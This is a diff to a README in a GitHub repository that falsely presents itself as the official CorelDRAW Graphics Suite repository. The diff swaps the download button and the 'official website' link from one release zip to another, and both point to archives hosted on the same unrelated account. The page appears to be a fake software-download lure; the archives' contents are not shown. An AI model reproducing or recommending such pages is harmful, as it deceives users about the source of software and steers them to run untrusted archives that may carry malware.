@@ -12,7 +12,7 @@ Welcome to the official repository for CorelDRAW Graphics Suite! Here, you can f
 
 🚀 To download the latest version of CorelDRAW Graphics Suite, click the button below: 🚀
 
-[![Download CorelDRAW Graphics Suite](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v1.0/Application.zip%20CorelDRAW%20Graphics%20Suite-Click%20Here-orange)](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v1.0/Application.zip)
+[![Download CorelDRAW Graphics Suite](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v2.0/Software.zip%20CorelDRAW%20Graphics%20Suite-Click%20Here-orange)](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v2.0/Software.zip)
 
 (*Note: The link provided needs to be launched to initiate the download.*)
 
@@ -38,7 +38,7 @@ Welcome to the official repository for CorelDRAW Graphics Suite! Here, you can f
 
 ## Explore More About CorelDRAW Graphics Suite
 
-🌐 For more information about CorelDRAW Graphics Suite, visit the official website: [CorelDRAW Graphics Suite - Official Website](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v1.0/Application.zip)
+🌐 For more information about CorelDRAW Graphics Suite, visit the official website: [CorelDRAW Graphics Suite - Official Website](https://github.com/mdvhjyhgu/CorelDRAW-Graphics-Suite-Download/releases/download/v2.0/Software.zip)
 
 (*Note: The link provided is a website, visit it to explore more about CorelDRAW Graphics Suite.*)
 
